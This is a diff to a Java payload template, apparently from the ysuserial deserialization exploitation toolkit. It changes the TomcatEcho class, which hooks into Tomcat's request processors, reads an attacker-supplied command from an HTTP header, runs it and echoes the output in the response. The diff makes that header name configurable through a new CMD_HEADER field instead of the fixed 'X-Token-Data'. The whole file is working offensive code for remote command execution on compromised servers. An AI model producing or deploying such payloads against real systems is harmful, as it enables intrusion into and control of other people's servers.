@@ -5,6 +5,8 @@ package org.su18.ysuserial.payloads.templates.echo;
  */
 public class TomcatEcho {
 
+	public static String CMD_HEADER;
+
 	static {
 		try {
 			boolean                 flag  = false;
@@ -48,7 +50,7 @@ public class TomcatEcho {
 						f.setAccessible(true);
 						Object req  = f.get(processor);
 						Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
-						str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"X-Token-Data"});
+						str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{CMD_HEADER});
 						if (str != null && !str.isEmpty()) {
 							resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
 							java.io.ByteArrayOutputStream baos = q(str);
